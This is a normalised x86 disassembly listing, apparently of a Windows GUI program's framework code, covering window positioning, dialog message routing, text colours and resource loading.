jmp r-xdata
dec eax
cmp eax 0x30
ja r-xdata
call [ GetVersion@IAT ]
mov ecx [ ebp + 0x10 ]
cmp al 0x4
sbb eax eax
and al 0xf0
add eax 0x2f
mov ebx [ ebx + 0x14 ]
mov eax [ ebp - 0x14 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
cmp [ ecx ] edx
je r-xdata
jmp [ eax * 4 + jump_table_41de08 ]
push 0x7
mov [ ebx + 0x4 ] eax
call sub_423919
mov ebx [ ebp + 0x10 ]
push 0x0
push 0x0
add eax 0x18
push 0xc000
push eax
call sub_41d8d6
test eax eax
mov [ ebp + 0x10 ] eax
jne r-xdata
push [ ebp + 0xc ]
call sub_420ab0
push eax
jmp r-xdata
push [ ebp + 0xc ]
jmp r-xdata
mov eax esi
shr eax 0x10
push eax
movsx eax si
push eax
push [ ebp + 0xc ]
call sub_41cbcb
jmp r-xdata
push esi
push [ ebp + 0xc ]
call sub_41cbcb
jmp r-xdata
lea ecx [ ebp - 0x24 ]
call sub_420a0e
mov eax [ esi + 0x4 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x20 ] eax
call sub_41c7aa
mov eax [ esi ]
mov esi [ esi + 0x8 ]
push eax
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x44 ] eax
call sub_41cbf2
test eax eax
jne r-xdata
lea ecx [ ebp - 0x24 ]
call sub_420a0e
mov eax [ esi + 0x4 ]
push [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x24 ]
push eax
mov ecx edi
mov [ ebp - 0x4 ] 0x2
call ebx
and [ ebp - 0x20 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x10 ] eax
lea ecx [ ebp - 0x24 ]
mov eax [ ebp + 0xc ]
shr eax 0x10
push eax
push esi
call sub_41cbcb
jmp r-xdata
mov eax [ ebp + 0xc ]
shr eax 0x10
push eax
movzx eax [ ebp + 0xc ]
jmp r-xdata
push esi
push esi
call sub_41f52d
push eax
mov eax [ ebp + 0xc ]
shr eax 0x10
mov ecx edi
call ebx
jmp r-xdata
push [ ebp + 0xc ]
jmp r-xdata
mov eax esi
shr eax 0x10
movsx eax ax
push eax
movsx eax si
mov eax esi
shr eax 0x10
push eax
movzx eax si
jmp r-xdata
push [ ebp + 0xc ]
call sub_41cbcb
push eax
push esi
call sub_41cbcb
push eax
xor eax eax
cmp [ edi + 0x1c ] esi
sete al
push [ ebp + 0xc ]
call sub_420ab0
push [ ebp + 0xc ]
call sub_41f52d
jmp r-xdata
mov eax esi
shr eax 0x10
push eax
movzx eax si
push eax
push [ ebp + 0xc ]
call sub_41f52d
jmp r-xdata
push [ ebp + 0xc ]
jmp r-xdata
push esi
mov eax esi
shr eax 0x10
push eax
movzx eax si
jmp r-xdata
movsx eax si
shr esi 0x10
movsx ecx si
push ecx
push esi
push [ ebp + 0xc ]
call sub_41cbcb
jmp r-xdata
push esi
call sub_41cbcb
push eax
jmp r-xdata
mov eax [ ebp + 0xc ]
shr eax 0x10
push eax
push esi
call sub_41cbcb
jmp r-xdata
mov eax [ ebp + 0xc ]
movsx edx ax
shr eax 0x10
cmp [ ecx + 0x10 ] 0x1d
mov [ ebp + 0x8 ] edx
movsx eax ax
mov [ ebp + 0xc ] eax
jne r-xdata
push esi
movsx eax si
shr esi 0x10
movsx ecx si
push ecx
mov ecx edi
call ebx
jmp r-xdata
push esi
mov eax [ ebp + 0xc ]
push esi
shr eax 0x10
movsx eax si
shr esi 0x10
movsx ecx si
push ecx
push esi
mov ecx edi
push [ ebp + 0xc ]
call ebx
movzx eax si
shr esi 0x10
push esi
push eax
mov eax [ ebp + 0xc ]
mov ecx edi
shr eax 0x10
push eax
movzx eax [ ebp + 0xc ]
push eax
call ebx
mov [ ebp - 0x10 ] eax
jmp r-xdata
push esi
push [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
mov ecx edi
call ebx
jmp r-xdata
push eax
mov ecx edi
call ebx
jmp r-xdata
push eax
jmp r-xdata
push esi
push eax
lea eax [ ebp - 0x24 ]
mov ecx edi
push eax
call ebx
and [ ebp - 0x20 ] 0x0
and [ ebp - 0x44 ] 0x0
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x10 ] eax
call sub_41d23d
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x24 ]
jmp r-xdata
mov eax [ edi + 0x34 ]
test eax eax
je r-xdata
push eax
movzx eax [ ebp + 0xc ]
mov [ ebp - 0x10 ] eax
mov ecx edi
call ebx
jmp r-xdata
mov ecx edi
call ebx
jmp r-xdata
push eax
push [ ebp + 0xc ]
mov ecx edi
call ebx
jmp r-xdata
push eax
jmp r-xdata
push eax
jmp r-xdata
call sub_41cbcb
jmp r-xdata
push eax
push [ ebp + 0xc ]
call sub_41cbcb
jmp r-xdata
push eax
jmp r-xdata
push [ ebp + 0xc ]
push eax
movzx eax [ ebp + 0xc ]
jmp r-xdata
push eax
push edx
jmp r-xdata
push esi
call sub_41cbcb
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jmp r-xdata
mov ecx edi
call ebx
test eax eax
jne r-xdata
call sub_420b2d
jmp r-xdata
lea eax [ ebp - 0x60 ]
push [ ebp - 0x44 ]
lea ecx [ eax + 0x20 ]
call sub_41aa65
test eax eax
je r-xdata
mov [ ebp - 0x28 ] eax
sub_41def6
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
movzx edi ax
xor ebx ebx
mov esi ecx
shr eax 0x10
cmp [ ebp + 0xc ] ebx
mov [ ebp + 0x8 ] eax
jne r-xdata
push sub_422741
mov ecx rw-data
call sub_423575
mov eax [ eax + 0xb8 ]
cmp eax [ esi + 0x1c ]
je r-xdata
cmp edi ebx
je r-xdata
push 0x1
pop eax
jmp r-xdata
push ebx
push [ ebp + 0xc ]
call sub_41e27d
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
lea ecx [ ebp - 0x2c ]
call sub_41decc
mov eax [ esi ]
lea ecx [ ebp - 0x2c ]
push ebx
push ecx
push 0xffffffff
push edi
mov ecx esi
mov [ ebp - 0x28 ] edi
call [ eax + 0xc ]
cmp [ ebp - 0x4 ] ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
cmp edi ebx
jne r-xdata
mov [ ebp + 0x8 ] ebx
mov eax [ esi ]
push ebx
push ebx
mov ecx esi
push [ ebp + 0x8 ]
push edi
call [ eax + 0xc ]
sub_41df82
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi ecx
mov ebx [ esi ]
push ebx
call [ GetDlgCtrlID@IAT ]
movzx eax ax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
push sub_422741
mov ecx rw-data
mov [ ebp + 0xc ] eax
call sub_423575
mov eax [ eax + 0xb8 ]
cmp eax [ edi + 0x1c ]
je r-xdata
push 0x1
pop eax
jmp r-xdata
push [ ebp + 0x10 ]
push ebx
call sub_41e27d
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
mov eax [ ebp + 0x10 ]
lea ecx [ ebp - 0xc ]
push 0x0
push ecx
movzx ecx [ ebp + 0xc ]
or ecx 0x4e0000
mov [ ebp - 0xc ] eax
mov eax [ edi ]
push ecx
push [ ebp - 0x4 ]
mov ecx edi
mov [ ebp - 0x8 ] esi
call [ eax + 0xc ]
sub_41dffc
push esi
push edi
test ecx ecx
je r-xdata
xor eax eax
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
mov edi [ GetParent@IAT ]
push eax
mov eax [ esi ]
mov ecx esi
call [ eax + 0xb0 ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
push [ esi + 0x1c ]
jmp r-xdata
pop edi
pop esi
retn
call edi
push eax
call sub_41cbcb
mov esi eax
test esi esi
je r-xdata
sub_41e03a
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_41cbf2
test eax eax
je r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
test eax 0x40000000
je r-xdata
mov ecx eax
call sub_404c6a
test eax eax
je r-xdata
push 0x4
push esi
call [ GetWindow@IAT ]
push esi
call [ GetParent@IAT ]
jmp r-xdata
pop esi
retn 0x4
mov eax [ eax + 0x1c ]
jmp r-xdata
sub_41e07f
test ecx ecx
je r-xdata
xor eax eax
retn
mov eax [ ecx + 0x1c ]
test eax eax
jne r-xdata
push esi
mov esi eax
push esi
push esi
call sub_41cbcb
pop esi
retn
mov esi eax
push eax
jmp r-xdata
call sub_41e03a
test eax eax
je r-xdata
sub_41e0a7
push esi
mov esi ecx
test esi esi
je r-xdata
xor eax eax
pop esi
retn
cmp [ esi + 0x1c ] 0x0
jne r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xb0 ]
test eax eax
jne r-xdata
test esi esi
je r-xdata
mov ecx esi
call sub_41dffc
mov esi eax
mov eax esi
pop esi
retn
mov ecx esi
mov esi eax
mov ecx eax
jmp r-xdata
call sub_41dffc
test eax eax
je r-xdata
sub_41e0e8
push ebp
mov ebp esp
push esi
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ GetDlgItem@IAT ]
mov edi [ GetTopWindow@IAT ]
mov esi eax
test esi esi
je r-xdata
push [ ebp + 0x8 ]
call edi
push esi
call edi
test eax eax
je r-xdata
xor eax eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_41e0e8
test eax eax
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
push esi
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_41e0e8
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
retn 0xc
push 0x2
push esi
call [ GetWindow@IAT ]
jmp r-xdata
call sub_41cbf2
test eax eax
jne r-xdata
call sub_41cbcb
jmp r-xdata
mov esi eax
test esi esi
je r-xdata
sub_41e161
push ebp
mov ebp esp
push esi
push edi
push [ ebp + 0x8 ]
mov edi [ GetTopWindow@IAT ]
call edi
pop edi
pop esi
pop ebp
retn 0x18
cmp [ ebp + 0x1c ] 0x0
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call [ SendMessageA@IAT ]
push esi
call sub_41cbf2
test eax eax
je r-xdata
push 0x2
push esi
call [ GetWindow@IAT ]
jmp r-xdata
push esi
call edi
test eax eax
je r-xdata
cmp [ ebp + 0x18 ] 0x0
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax + 0x1c ]
push eax
call sub_41ca0a
jmp r-xdata
mov esi eax
test esi esi
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_41e161
sub_41e1e3
push esi
mov esi ecx
call sub_41f1b7
cmp [ esp + 0xc ] 0x0
jne r-xdata
push eax
push 0x0
mov ecx esi
call sub_41f19d
push eax
push [ esp + 0x14 ]
call [ AdjustWindowRectEx@IAT ]
pop esi
retn 0x8
and ah 0xfd
sub_41e20e
push esi
push edi
mov edi [ esp + 0x10 ]
mov esi [ edi ]
xor eax eax
push esi
call sub_41cbf2
test eax eax
je r-xdata
cmp esi [ esp + 0xc ]
je r-xdata
mov edx [ eax ]
push edi
mov ecx eax
call [ edx + 0x90 ]
test eax eax
jne r-xdata
push esi
call [ GetParent@IAT ]
mov esi eax
jmp r-xdata
push 0x1
pop eax
jmp r-xdata
test esi esi
je r-xdata
pop edi
pop esi
retn 0x8
sub_41e250
push esi
mov esi ecx
push sub_422741
mov ecx rw-data
call sub_423575
push [ esp + 0x8 ]
mov edx [ esi ]
mov ecx esi
push [ eax + 0x40 ]
push [ eax + 0x3c ]
push [ eax + 0x38 ]
call [ edx + 0xa8 ]
pop esi
retn 0x4
sub_41e27d
mov eax sub_425f28
call sub_40cc20
sub esp 0x3c
push esi
push edi
push 0x0
call sub_41cb59
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov edi [ ebp + 0x8 ]
lea esi [ eax + 0x4 ]
push edi
mov ecx esi
call sub_41aa65
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x8
push [ ebp + 0xc ]
mov ecx eax
call sub_41e250
push edi
call [ GetParent@IAT ]
push eax
mov ecx esi
call sub_41aa65
test eax eax
je r-xdata
mov eax [ eax + 0x34 ]
test eax eax
je r-xdata
push edi
lea ecx [ eax + 0x20 ]
call sub_41aa65
mov esi eax
test esi esi
je r-xdata
push edi
lea ecx [ ebp - 0x48 ]
call sub_41c7e8
push [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x10 ] esi
call sub_41e250
and [ ebp - 0x2c ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x48 ]
mov esi eax
call sub_41d23d
mov eax esi
jmp r-xdata
sub_41e321
push ebp
mov ebp esp
cmp [ ecx + 0x38 ] 0x0
push esi
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41e37c
push [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
lea eax [ esi + 0x2000 ]
push eax
push [ ecx + 0x1c ]
call [ SendMessageA@IAT ]
cmp esi 0x132
jb r-xdata
mov ecx [ ebp + 0x14 ]
test ecx ecx
je r-xdata
cmp esi 0x138
ja r-xdata
push 0x1
pop eax
jmp r-xdata
mov [ ecx ] eax
test eax eax
je r-xdata
pop esi
pop ebp
retn 0x10
sub_41e37c
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov edx 0x111
cmp eax edx
push esi
ja r-xdata
cmp eax 0x114
jb r-xdata
je r-xdata
cmp eax 0x132
jb r-xdata
cmp eax 0x115
jbe r-xdata
mov eax [ ebp + 0xc ]
xor esi esi
shr eax 0x10
push esi
or eax 0xbd110000
push esi
push eax
push esi
call sub_41b487
test eax eax
je r-xdata
cmp eax 0x2b
jb r-xdata
xor eax eax
cmp eax 0x138
ja r-xdata
push [ ebp + 0x14 ]
add eax 0xbc00
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_41d95a
jmp r-xdata
cmp eax 0x210
jne r-xdata
mov ecx [ ebp + 0x14 ]
push 0x1
cmp ecx esi
pop eax
je r-xdata
cmp eax 0x2f
jbe r-xdata
mov edx [ ebp + 0xc ]
add eax 0xfffffece
push edi
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xc ]
push edi
xor esi esi
push eax
push esi
push 0xbc19
mov [ ebp - 0x8 ] edx
call sub_41d95a
cmp [ edi ] esi
pop edi
jne r-xdata
pop esi
leave
retn 0x10
mov [ ecx ] eax
jmp r-xdata
cmp eax 0x39
je r-xdata
cmp eax 0x4e
jne r-xdata
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] eax
mov edx [ eax + 0x8 ]
xor esi esi
lea eax [ ebp - 0x8 ]
push esi
push eax
movzx eax dx
or eax 0xbc4e0000
push eax
push esi
call sub_41b487
jmp r-xdata
sub_41e464
cmp [ esp + 0x4 ] 0x1
push esi
mov esi ecx
je r-xdata
push 0x0
push [ esp + 0x10 ]
call sub_41e27d
test eax eax
jne r-xdata
cmp [ esp + 0x8 ] 0x2
jne r-xdata
pop esi
retn 0x8
mov ecx esi
call sub_41cb32
sub_41e4b3
push esi
mov esi ecx
call sub_422d64
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
call sub_422d64
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x1c ] esi
jne r-xdata
mov ecx esi
call sub_41f19d
test eax 0x40000000
jne r-xdata
call sub_41ad89
test eax eax
je r-xdata
mov ecx rw-data
call sub_41f6b1
mov ecx esi
call sub_41cb32
pop esi
retn
push 0x1
push 0x1
push 0x0
push 0x0
push 0x15
push [ esi + 0x1c ]
call sub_41e161
call sub_41ad89
cmp [ eax + 0x1c ] esi
jne r-xdata
push sub_422775
mov ecx rw-data
call sub_42360a
mov eax [ eax + 0x1c ]
test eax eax
je r-xdata
call eax
sub_41e530
push esi
push edi
mov edi ecx
call sub_422d64
cmp [ eax + 0x14 ] 0x0
jne r-xdata
and [ rw-data ] 0x0
push 0x0
push 0x0
mov ecx edi
call sub_41e632
pop edi
pop esi
retn 0x8
push sub_422775
mov ecx rw-data
call sub_42360a
mov esi eax
call sub_41ad89
test eax eax
je r-xdata
call sub_41ad89
cmp [ eax + 0x1c ] edi
jne r-xdata
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
call eax
sub_41e583
push esi
mov esi ecx
call sub_422d64
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov ecx esi
call sub_41f19d
test eax 0x40000000
jne r-xdata
cmp [ eax + 0x1c ] esi
jne r-xdata
pop esi
retn 0x4
call sub_41cafd
push 0x1
push 0x1
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ esi + 0x1c ]
call sub_41e161
push [ esp + 0x8 ]
mov ecx eax
call sub_41acdc
sub_41e5ce
push ebx
push esi
push edi
mov ebx ecx
call sub_41f19d
test eax 0x40000000
jne r-xdata
mov ecx ebx
call sub_41cb32
call sub_403ba6
mov esi eax
test esi esi
je r-xdata
mov edi [ GetKeyState@IAT ]
push 0x10
call edi
test ax ax
jl r-xdata
push 0x11
call edi
test ax ax
jl r-xdata
push 0x12
call edi
test ax ax
jl r-xdata
push 0x0
push 0xe146
push 0x111
push [ esi + 0x1c ]
call [ SendMessageA@IAT ]
push 0x1
pop eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn 0x4
sub_41e632
push esi
mov esi ecx
call sub_403ba6
cmp eax esi
jne r-xdata
mov ecx esi
call sub_41f19d
test eax 0x40000000
jne r-xdata
mov ecx rw-data
call sub_41f6f5
mov ecx esi
call sub_41cb32
pop esi
retn 0x8
call sub_41cafd
push 0x1
push 0x1
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ esi + 0x1c ]
call sub_41e161
sub_41e67b
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push esi
push eax
mov eax [ ebp + 0xc ]
mov esi ecx
push [ eax + 0x4 ]
call sub_41e27d
test eax eax
je r-xdata
mov ecx esi
call sub_41cb32
mov eax [ ebp + 0xc ]
jmp r-xdata
pop esi
pop ebp
retn 0x8
sub_41e6a5
push esi
mov esi ecx
mov ecx [ esp + 0x10 ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_41cb32
push 0x0
call sub_41e250
test eax eax
jne r-xdata
pop esi
retn 0xc
sub_41e6c6
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
mov edi [ PeekMessageA@IAT ]
mov esi 0x121
push 0x1
push esi
push esi
lea eax [ ebp - 0x1c ]
push 0x0
mov ebx ecx
push eax
mov ecx ebx
call sub_41cb32
pop edi
pop esi
pop ebx
leave
retn 0x8
lea eax [ ebp - 0x1c ]
push eax
call [ DispatchMessageA@IAT ]
push 0x1
push esi
push esi
lea eax [ ebp - 0x1c ]
push 0x0
push eax
jmp r-xdata
call edi
test eax eax
je r-xdata
sub_41e710
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
lea eax [ ebp + 0xc ]
push eax
call sub_41e250
test eax eax
je r-xdata
mov ecx esi
call sub_41cb32
mov eax [ ebp + 0xc ]
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_41e737
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx ecx
lea eax [ ebp + 0xc ]
push eax
mov ecx edi
call sub_41e250
test eax eax
je r-xdata
push sub_422a5b
mov ecx rw-data
call sub_42360a
test edi edi
mov esi eax
je r-xdata
mov eax [ ebp + 0xc ]
jmp r-xdata
push [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
push [ esi + 0x4 ]
push [ ebp + 0x10 ]
push edi
push [ eax + 0x4 ]
call sub_41e79a
test eax eax
jne r-xdata
mov edi [ edi + 0x1c ]
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax [ esi + 0x4 ]
mov ecx ebx
call sub_41cb32
jmp r-xdata
sub_41e79a
push ebp
mov ebp esp
sub esp 0xc
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax 0x1
je r-xdata
test eax eax
je r-xdata
cmp eax 0x5
je r-xdata
cmp eax 0x2
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0xc
push [ ebp + 0x14 ]
call [ GetObjectA@IAT ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call [ SetBkColor@IAT ]
mov eax [ ebp + 0x18 ]
cmp eax 0xffffffff
jne r-xdata
push eax
push [ ebp + 0xc ]
call sub_4212c1
test eax eax
je r-xdata
push eax
push [ ebp + 0x8 ]
call [ SetTextColor@IAT ]
push 0x1
pop eax
jmp r-xdata
push 0x8
call [ GetSysColor@IAT ]
leave
retn 0x14
sub_41e817
mov eax sub_425f34
call sub_40cc20
sub esp 0x24
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x10 ] esp
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x2c ]
push esi
call sub_41e8b9
call sub_422b32
mov edi eax
and [ ebp + 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x14 ] edi
mov ecx [ edi + 0xb8 ]
lea eax [ edi + 0xb8 ]
mov [ ebp - 0x18 ] ecx
mov ecx [ esi + 0x1c ]
mov [ eax ] ecx
mov eax [ esi ]
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx esi
call [ eax + 0x84 ]
mov [ ebp + 0x8 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0xc ]
mov [ edi + 0xb8 ] eax
mov eax [ ebp + 0x8 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
sub_41e8cf
push ebp
mov ebp esp
sub esp 0x60
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x8 ] esi
call sub_41f19d
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test [ ebp - 0x1 ] 0x40
je r-xdata
mov edi [ eax + 0x1c ]
jmp r-xdata
push 0x4
push [ esi + 0x1c ]
call [ GetWindow@IAT ]
push [ esi + 0x1c ]
call [ GetParent@IAT ]
jmp r-xdata
mov ebx [ GetWindowRect@IAT ]
lea eax [ ebp - 0x28 ]
push eax
push [ esi + 0x1c ]
call ebx
test [ ebp - 0x1 ] 0x40
jne r-xdata
push 0x0
push 0x0
push 0x36b
push edi
call [ SendMessageA@IAT ]
test eax eax
je r-xdata
mov edi eax
test edi edi
je r-xdata
push [ esi + 0x1c ]
call [ GetParent@IAT ]
mov esi [ GetClientRect@IAT ]
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
push ebx
call esi
lea eax [ ebp - 0x38 ]
push eax
push edi
call esi
lea eax [ ebp - 0x38 ]
push 0x2
push eax
push ebx
push edi
call [ MapWindowPoints@IAT ]
test edi edi
je r-xdata
mov edi eax
mov eax [ ebp - 0x10 ]
add edi ecx
cmp edi eax
jle r-xdata
mov ecx [ ebp - 0x18 ]
jmp r-xdata
test edi edi
mov [ ebp - 0x60 ] 0x28
jne r-xdata
push 0xfffffff0
push edi
call [ GetWindowLongA@IAT ]
test eax 0x10000000
je r-xdata
cmp esi [ ebp - 0x14 ]
jge r-xdata
sub eax [ ebp - 0x20 ]
add eax [ ebp - 0x28 ]
mov ecx eax
lea eax [ ebp - 0x38 ]
push eax
push edi
call ebx
lea eax [ ebp - 0x60 ]
push eax
push 0x2
push edi
call sub_404b6c
push eax
call sub_404bd7
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call [ CopyRect@IAT ]
jmp r-xdata
call sub_403ba6
test eax eax
je r-xdata
xor edi edi
test eax 0x20000000
je r-xdata
add ebx esi
cmp ebx [ ebp - 0xc ]
jle r-xdata
mov esi [ ebp - 0x14 ]
jmp r-xdata
mov eax [ ebp - 0x38 ]
mov ecx [ ebp - 0x30 ]
mov edi [ ebp - 0x20 ]
add eax ecx
sub edi [ ebp - 0x28 ]
mov ebx [ ebp - 0x1c ]
cdq
sub eax edx
sub ebx [ ebp - 0x24 ]
mov ecx eax
mov eax edi
cdq
sub eax edx
mov edx [ ebp - 0x2c ]
sar ecx 0x1
sar eax 0x1
sub ecx eax
mov eax [ ebp - 0x34 ]
add eax edx
cdq
sub eax edx
mov esi eax
mov eax ebx
cdq
sub eax edx
sar esi 0x1
sar eax 0x1
sub esi eax
cmp ecx [ ebp - 0x18 ]
jge r-xdata
lea ecx [ ebp - 0x60 ]
push ecx
push 0x1
push eax
call sub_404b6c
push eax
call sub_404bd7
mov esi [ CopyRect@IAT ]
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x38 ]
push eax
call esi
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call esi
jmp r-xdata
mov eax [ eax + 0x1c ]
push 0x15
push 0xffffffff
push 0xffffffff
push esi
push ecx
mov ecx [ ebp - 0x8 ]
push 0x0
call sub_41f283
pop edi
pop esi
pop ebx
leave
retn 0x4
mov esi [ ebp - 0x24 ]
sub esi [ ebp - 0x1c ]
add esi [ ebp - 0xc ]
sub_41ea88
push ebx
push esi
push edi
xor edi edi
cmp [ esp + 0x10 ] edi
mov ebx ecx
je r-xdata
push edi
mov ecx ebx
call sub_41ead8
call sub_422d64
mov esi [ eax + 0xc ]
push 0xf0
push [ esp + 0x14 ]
push esi
call [ FindResourceA@IAT ]
cmp eax edi
je r-xdata
push eax
push esi
call [ LoadResource@IAT ]
cmp eax edi
jne r-xdata
push eax
call [ LockResource@IAT ]
mov edi eax
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn 0x4
sub_41ead8
push ebp
mov ebp esp
sub esp 0x28
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx ecx
test esi esi
mov [ ebp - 0x4 ] 0x1
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push 0x364
push [ ebx + 0x1c ]
call sub_41e161
push edi
mov edi [ SendDlgItemMessageA@IAT ]
cmp [ ebp - 0x4 ] 0x0
pop edi
je r-xdata
inc esi
inc esi
mov ax [ esi ]
inc esi
inc esi
mov edx [ esi ]
add esi 0x4
cmp ax 0x1234
mov [ ebp + 0x8 ] edx
je r-xdata
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
leave
retn 0x4
or [ ebp - 0x24 ] 0xffffffff
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x20 ] esi
push 0x401
jmp r-xdata
cmp ax 0x401
jne r-xdata
movzx eax cx
push eax
push [ ebx + 0x1c ]
call edi
cmp eax 0xffffffff
jne r-xdata
cmp ax 0x403
jne r-xdata
mov eax 0x180
jmp r-xdata
add esi [ ebp + 0x8 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
and [ ebp - 0x4 ] 0x0
cmp ax 0x401
jne r-xdata
mov eax 0x143
movzx eax ax
push esi
push 0x0
push eax
mov cx [ esi ]
test cx cx
je r-xdata
cmp ax 0x180
je r-xdata
cmp ax 0x143
jne r-xdata
sub_41ebaa
mov edx [ esp + 0x4 ]
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
cmp eax 0x200
jb r-xdata
cmp eax 0x108
jbe r-xdata
xor eax eax
cmp eax 0x209
ja r-xdata
push edx
call sub_41f16a
jmp r-xdata
retn 0x4
sub_41ebda
sub esp 0x10
push ebx
push ebp
push esi
push edi
push 0x1
xor edi edi
test [ esp + 0x28 ] 0x4
pop ebx
mov esi ecx
mov [ esp + 0x18 ] ebx
mov [ esp + 0x14 ] edi
je r-xdata
mov [ esp + 0x10 ] edi
call sub_41f19d
test eax 0x10000000
mov [ esp + 0x10 ] ebx
je r-xdata
call sub_41ad89
mov edx [ eax ]
mov ecx eax
call [ edx + 0x5c ]
test eax eax
je r-xdata
push edi
push edi
push edi
push edi
push ebp
call [ PeekMessageA@IAT ]
test eax eax
jne r-xdata
push [ esi + 0x1c ]
call [ GetParent@IAT ]
or [ esi + 0x24 ] 0x18
mov [ esp + 0x1c ] eax
call sub_41ad89
mov ebx [ UpdateWindow@IAT ]
mov ebp eax
add ebp 0x30
push edi
call sub_425a0d
or eax 0xffffffff
jmp r-xdata
cmp [ esp + 0x10 ] edi
je r-xdata
cmp [ esp + 0x10 ] edi
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn 0x4
mov eax [ esi ]
mov ecx esi
call [ eax + 0x70 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x4 ]
cmp eax 0x118
je r-xdata
test [ esp + 0x24 ] 0x1
jne r-xdata
push 0x1
mov ecx esi
call sub_41f2d2
push [ esi + 0x1c ]
call ebx
mov [ esp + 0x10 ] edi
and [ esi + 0x24 ] 0xffffffe7
mov eax [ esi + 0x2c ]
call sub_41ad89
mov edx [ eax ]
push ebp
